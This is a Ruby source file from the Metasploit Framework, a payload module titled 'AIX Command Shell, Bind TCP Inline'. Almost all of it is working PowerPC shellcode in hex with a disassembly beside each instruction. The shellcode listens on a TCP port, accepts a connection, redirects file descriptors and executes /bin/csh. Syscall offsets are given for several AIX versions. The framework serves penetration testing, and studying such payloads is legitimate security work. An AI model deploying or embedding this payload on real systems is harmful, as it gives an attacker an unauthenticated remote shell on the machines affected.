##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'AIX Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'aix',
			'Arch'          => ARCH_PPC,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 77, 'n' ],
						},
				}
	  ))

	register_options(
	  [
		OptString.new('AIXLEVEL', [ true, "AIX Level", "5.3.0" ]),
	  ], self.class)
	end

	def generate
		case datastore['AIXLEVEL']
		when '4.1.0'
			cal_socket = "\x38\x5d\xfe\x58"      #   cal     r2,-424(r29)               #
			cal_bind   = "\x38\x5d\xfe\x57"      #   cal     r2,-425(r29)               #
			cal_listen = "\x38\x5d\xfe\x56"      #   cal     r2,-426(r29)               #
			cal_accept = "\x38\x5d\xfe\x54"      #   cal     r2,-428(r29)               #
			cal_close  = "\x38\x5d\xfe\x5f"      #   cal     r2,-417(r29)               #
			cal_kfcntl = "\x38\x5d\xfe\xd7"      #   cal     r2,-297(r29)               #
			cal_execve = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
		when '4.2.0'
			cal_socket = "\x38\x5d\xfe\x5c"      #   cal     r2,-420(r29)               #
			cal_bind   = "\x38\x5d\xfe\x5b"      #   cal     r2,-421(r29)               #
			cal_listen = "\x38\x5d\xfe\x5a"      #   cal     r2,-422(r29)               #
			cal_accept = "\x38\x5d\xfe\x59"      #   cal     r2,-423(r29)               #
			cal_close  = "\x38\x5d\xfe\x63"      #   cal     r2,-413(r29)               #
			cal_kfcntl = "\x38\x5d\xfe\xe8"      #   cal     r2,-280(r29)               #
			cal_execve = "\x38\x5d\xfe\x03"      #   cal     r2,-509(r29)               #
		when '4.3.0'
			cal_socket = "\x38\x5d\xfe\x6a"      #   cal     r2,-406(r29)               #
			cal_bind   = "\x38\x5d\xfe\x69"      #   cal     r2,-407(r29)               #
			cal_listen = "\x38\x5d\xfe\x68"      #   cal     r2,-408(r29)               #
			cal_accept = "\x38\x5d\xfe\x66"      #   cal     r2,-410(r29)               #
			cal_close  = "\x38\x5d\xfe\x72"      #   cal     r2,-398(r29)               #
			cal_kfcntl = "\x38\x5d\xfe\xfd"      #   cal     r2,-259(r29)               #
			cal_execve = "\x38\x5d\xfe\x05"      #   cal     r2,-507(r29)               #
		when '4.3.3'
			cal_socket = "\x38\x5d\xfe\x79"      #   cal     r2,-391(r29)               #
			cal_bind   = "\x38\x5d\xfe\x78"      #   cal     r2,-392(r29)               #
			cal_listen = "\x38\x5d\xfe\x77"      #   cal     r2,-393(r29)               #
			cal_accept = "\x38\x5d\xfe\x76"      #   cal     r2,-394(r29)               #
			cal_close  = "\x38\x5d\xfe\x83"      #   cal     r2,-381(r29)               #
			cal_kfcntl = "\x38\x5d\xff\x10"      #   cal     r2,-240(r29)               #
			cal_execve = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
		when '5.3.0'
			cal_socket = "\x38\x5d\xfe\x8e"      #   cal     r2,-370(r29)               #
			cal_bind   = "\x38\x5d\xfe\x8d"      #   cal     r2,-371(r29)               #
			cal_listen = "\x38\x5d\xfe\x8c"      #   cal     r2,-372(r29)               #
			cal_accept = "\x38\x5d\xfe\x8b"      #   cal     r2,-373(r29)               #
			cal_close  = "\x38\x5d\xfe\xa1"      #   cal     r2,-351(r29)               #
			cal_kfcntl = "\x38\x5d\xff\x43"      #   cal     r2,-189(r29)               #
			cal_execve = "\x38\x5d\xfe\x06"      #   cal     r2,-506(r29)               #
		end

	payload =
		"\x7f\xff\xfa\x79"     +#   xor.    r31,r31,r31                #
		"\x40\x82\xff\xfd"     +#   bnel    <bndsockcode>              #
		"\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
		"\x3b\xde\x01\xff"     +#   cal     r30,511(r30)               #
		"\x3b\xde\xfe\x1d"     +#   cal     r30,-483(r30)              #
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x20"     +#   bctr                               #
		"\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
		"\x44\xff\xff\x02"     +#   svca    0                          #
		"\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
		"\x3b\xa0\x01\xff"     +#   lil     r29,511                    #
		"\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
		"\x38\x9d\xfe\x02"     +#   cal     r4,-510(r29)               #
		"\x38\x7d\xfe\x03"     +#   cal     r3,-509(r29)               #
		cal_socket +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7c\x7c\x1b\x78"     +#   mr      r28,r3                     #
		"\x38\xbd\xfe\x11"     +#   cal     r5,-495(r29)               #
		"\x3f\x60\xff\x02"     +#   liu     r27,-254                   #
		"\x63\x7b\x04\xd2"     +#   oril    r27,r27,1234               #
		"\x97\xe1\xff\xfc"     +#   stu     r31,-4(r1)                 #
		"\x97\x61\xff\xfc"     +#   stu     r27,-4(r1)                 #
		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
		cal_bind +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
		"\x7f\x83\xe3\x78"     +#   mr      r3,r28                     #
		cal_listen +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
		"\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
		"\x7f\x83\xe3\x78"     +#   mr      r3,r28                     #
		cal_accept +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7c\x7a\x1b\x78"     +#   mr      r26,r3                     #
		"\x3b\x3d\xfe\x03"     +#   cal     r25,-509(r29)              #
		"\x7f\x23\xcb\x78"     +#   mr      r3,r25                     #
		cal_close +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7f\x25\xcb\x78"     +#   mr      r5,r25                     #
		"\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
		"\x7f\x43\xd3\x78"     +#   mr      r3,r26                     #
		cal_kfcntl +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x37\x39\xff\xff"     +#   ai.     r25,r25,-1                 #
		"\x40\x80\xff\xd4"     +#   bge     <bndsockcode+160>          #
		"\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
		"\x40\x82\xff\xfd"     +#   bnel    <bndsockcode+208>          #
		"\x7f\x08\x02\xa6"     +#   mflr    r24                        #
		"\x3b\x18\x01\xff"     +#   cal     r24,511(r24)               #
		"\x38\x78\xfe\x29"     +#   cal     r3,-471(r24)               #
		"\x98\xb8\xfe\x31"     +#   stb     r5,-463(r24)               #
		"\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
		"\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
		cal_execve +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x20"     +#   bctr                               #
		"/bin/csh"

	end

end
